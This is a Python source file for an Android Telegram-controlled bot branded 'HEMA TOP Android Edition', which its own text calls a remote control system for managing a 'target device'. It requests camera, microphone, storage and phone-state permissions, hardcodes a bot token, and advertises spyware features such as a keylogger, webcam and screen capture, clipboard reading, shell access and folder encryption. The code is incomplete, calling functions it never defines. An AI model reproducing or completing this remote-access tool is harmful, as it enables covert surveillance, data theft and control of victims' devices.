import os
import re
import time
import telebot
import platform
import subprocess
import json
from datetime import datetime
import io
import sys
import threading
from concurrent.futures import ThreadPoolExecutor
import urllib.parse
import logging
import traceback
import psutil
import hashlib
import base64
from cryptography.fernet import Fernet
import atexit
import socket
import tempfile
import shutil
from kivy.app import App
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.boxlayout import BoxLayout
from kivy.clock import Clock
from jnius import autoclass
from android.permissions import request_permissions, Permission

# Configure logging
from logging.handlers import RotatingFileHandler
log_file = 'bot.log'
max_bytes = 5 * 1024 * 1024
backup_count = 3

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        RotatingFileHandler(log_file, maxBytes=max_bytes, backupCount=backup_count),
        logging.StreamHandler()
    ]
)

# Request Android permissions
request_permissions([
    Permission.CAMERA,
    Permission.RECORD_AUDIO,
    Permission.READ_EXTERNAL_STORAGE,
    Permission.WRITE_EXTERNAL_STORAGE,
    Permission.INTERNET,
    Permission.ACCESS_NETWORK_STATE,
    Permission.ACCESS_WIFI_STATE,
    Permission.READ_PHONE_STATE
])

# Security settings
ENCRYPTION_KEY = Fernet.generate_key()
cipher_suite = Fernet(ENCRYPTION_KEY)

def encrypt_data(data):
    if isinstance(data, str):
        data = data.encode()
    return cipher_suite.encrypt(data)

def decrypt_data(encrypted_data):
    return cipher_suite.decrypt(encrypted_data).decode()

# Bot token
TOKEN = "7871185686:AAGiurUVdon5DJeoQqEsT-I26FamrJfapps"

try:
    bot = telebot.TeleBot(TOKEN, parse_mode=None, threaded=True)
except Exception as e:
    logging.error(f"Failed to initialize bot: {e}")
    sys.exit(1)

# Global variables
cd = os.path.expanduser("~")

# Create thread pool
executor = ThreadPoolExecutor(max_workers=20)

# Rate limiting
RATE_LIMIT = 60
last_command_time = {}

def rate_limit(user_id):
    current_time = time.time()
    if user_id in last_command_time:
        if current_time - last_command_time[user_id] < RATE_LIMIT:
            return False
    last_command_time[user_id] = current_time
    return True

def run_command_async(func, *args, **kwargs):
    try:
        return executor.submit(func, *args, **kwargs)
    except Exception as e:
        logging.error(f"Error in run_command_async: {e}")
        return None

# Dictionary to store active users and their states
active_users = {}
current_user = None
user_languages = {}

# File paths
USERS_FILE = os.path.join(os.path.expanduser("~"), "bot_users.json")
LANGUAGE_FILE = os.path.join(os.path.expanduser("~"), "bot_languages.json")

# Load existing data
def load_data():
    try:
        if os.path.exists(USERS_FILE):
            with open(USERS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        return {}
    except Exception as e:
        logging.error(f"Error loading users: {e}")
        return {}

def save_data():
    try:
        os.makedirs(os.path.dirname(USERS_FILE), exist_ok=True)
        with open(USERS_FILE, 'w', encoding='utf-8') as f:
            json.dump(active_users, f, ensure_ascii=False)
    except Exception as e:
        logging.error(f"Error saving users: {e}")

# Load existing data
active_users = load_data()

def handle_error(message, error):
    user_id = str(message.from_user.id)
    error_details = traceback.format_exc()
    
    logging.error(f"Error for user {user_id}: {error}\n{error_details}")
    
    error_message = f"{get_translation('error', user_id)} {str(error)}\n\n"
    error_message += f"{get_translation('suggested_solution', user_id)}\n"
    
    if "Permission denied" in str(error):
        error_message += get_translation('check_permissions', user_id)
    elif "File not found" in str(error):
        error_message += get_translation('check_file', user_id)
    else:
        error_message += get_translation('check_command', user_id)
    
    error_message += f"\n👨‍💻 {get_translation('developer', user_id)}"
    
    if len(error_message) > 4000:
        chunks = [error_message[i:i+4000] for i in range(0, len(error_message), 4000)]
        for chunk in chunks:
            bot.send_message(message.chat.id, chunk)
    else:
        bot.send_message(message.chat.id, error_message)

def cleanup_resources():
    try:
        executor.shutdown(wait=False)
        
        temp_files = ['capture.png', 'webcam.jpg', 'temp_wallpaper.jpg']
        for file in temp_files:
            if os.path.exists(file):
                os.remove(file)
                
        save_data()
        
    except Exception as e:
        logging.error(f"Error during cleanup: {e}")

# Register cleanup function
atexit.register(cleanup_resources)

# Language translations
TRANSLATIONS = {
    'en': {
        'welcome': "⚡️ Welcome to HEMA TOP Android Edition ⚡️\n\nYour advanced remote control system is ready. Please select an option below to manage the target device:",
        'enter_password': "🔐 Please enter the password to access the bot:",
        'wrong_password': "❌ Wrong password! Please try again.",
        'select_language': "🌐 Please select your preferred language:",
        'commands': "📋 Available Commands:\n\n",
        'developer': "\n✨ Developer: @w1Hema ✨\n\n",
        'whatsapp': "Contact WhatsApp",
        'facebook': "Facebook",
        'github': "GitHub",
        'active_users': "Active Users",
        'no_active_users': "❌ No active users",
        'switch_user': "Switch to user:",
        'current_user': "👤 Current user:",
        'user_not_found': "❌ User not found",
        'error': "❌ An error occurred:",
        'suggested_solution': "🔧 Suggested solution:",
        'check_permissions': "1. Make sure you have sufficient permissions\n2. Check app permissions in settings",
        'check_file': "1. Make sure the file exists\n2. Check the correct path",
        'check_command': "1. Make sure the command is correct\n2. Check your internet connection",
        'screen': "📸 Capture Screen",
        'sys_info': "💻 System Info",
        'ip_address': "🌐 IP Address",
        'cd_folder': "📁 Change Directory",
        'list_contents': "📋 List Contents",
        'upload_file': "📤 Upload File",
        'encrypt_folder': "🔒 Encrypt Folder",
        'decrypt_folder': "🔓 Decrypt Folder",
        'webcam_capture': "📹 Capture Webcam Image",
        'lock_system': "🔒 Lock System",
        'clipboard_content': "📋 Clipboard Content",
        'shell_access': "💻 Shell Access",
        'wifi_networks': "📶 WiFi Networks",
        'keylogger': "⌨️ Keylogger",
        'text_to_speech': "🔊 Text to Speech",
        'shutdown': "⏹️ Shutdown",
        'change_wallpaper': "🖼️ Change Wallpaper",
        'vip_user': "👑 VIP User"
    },
    'ar': {
        'welcome': "🎯 مرحباً بك في هيما توب نسخة أندرويد 🎯\n\nاختر الأمر المطلوب من القائمة أدناه:",
        'enter_password': "🔐 الرجاء إدخال كلمة المرور للوصول إلى البوت:",
        'wrong_password': "❌ كلمة المرور خاطئة! الرجاء المحاولة مرة أخرى.",
        'select_language': "🌐 الرجاء اختيار لغتك المفضلة:",
        'commands': "📋 الأوامر المتاحة:\n\n",
        'developer': "\n✨ المطور: @w1Hema ✨\n\n",
        'whatsapp': "التواصل واتساب",
        'facebook': "فيسبوك",
        'github': "جيت هاب",
        'active_users': "المستخدمين النشطين",
        'no_active_users': "❌ لا يوجد مستخدمين نشطين",
        'switch_user': "التبديل إلى المستخدم:",
        'current_user': "👤 المستخدم الحالي:",
        'user_not_found': "❌ المستخدم غير موجود",
        'error': "❌ حدث خطأ:",
        'suggested_solution': "🔧 الحل المقترح:",
        'check_permissions': "1. تأكد من أن لديك الصلاحيات الكافية\n2. تحقق من صلاحيات التطبيق في الإعدادات",
        'check_file': "1. تأكد من وجود الملف\n2. تحقق من المسار الصحيح",
        'check_command': "1. تأكد من صحة الأمر\n2. تحقق من الاتصال بالإنترنت",
        'screen': "📸 التقاط الشاشة",
        'sys_info': "💻 معلومات النظام",
        'ip_address': "🌐 عنوان IP",
        'cd_folder': "📁 التنقل في المجلدات",
        'list_contents': "📋 عرض المحتويات",
        'upload_file': "📤 رفع ملف",
        'encrypt_folder': "🔒 تشفير مجلد",
        'decrypt_folder': "🔓 فك تشفير مجلد",
        'webcam_capture': "📹 التقاط صورة",
        'lock_system': "🔒 قفل النظام",
        'clipboard_content': "📋 محتوى الحافظة",
        'shell_access': "💻 الطرفية",
        'wifi_networks': "📶 شبكات الواي فاي",
        'keylogger': "⌨️ تسجيل المفاتيح",
        'text_to_speech': "🔊 تحويل النص إلى صوت",
        'shutdown': "⏹️ إيقاف التشغيل",
        'change_wallpaper': "🖼️ تغيير الخلفية",
        'vip_user': "👑 VIP User"
    }
}

# Add Android-specific functions here
def get_android_specific_info():
    try:
        # Get Android-specific information using pyjnius
        Build = autoclass('android.os.Build')
        info = {
            'Android Version': Build.VERSION.RELEASE,
            'Android SDK': Build.VERSION.SDK_INT,
            'Device Model': Build.MODEL,
            'Device Manufacturer': Build.MANUFACTURER,
            'Device Brand': Build.BRAND,
            'Device Product': Build.PRODUCT,
            'Device Hardware': Build.HARDWARE,
            'Device Serial': Build.SERIAL
        }
        return info
    except Exception as e:
        logging.error(f"Error getting Android info: {e}")
        return {}

# Add the rest of your Android-specific code here...

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logging.info("Bot shutting down by user request")
        print("\nBot is shutting down...")
        cleanup_resources()
        sys.exit(0)
    except Exception as e:
        log_error(f"Fatal error: {e}")
        print(f"Fatal error: {e}")
        print("Bot will restart in 5 seconds...")
        time.sleep(5)
        main() 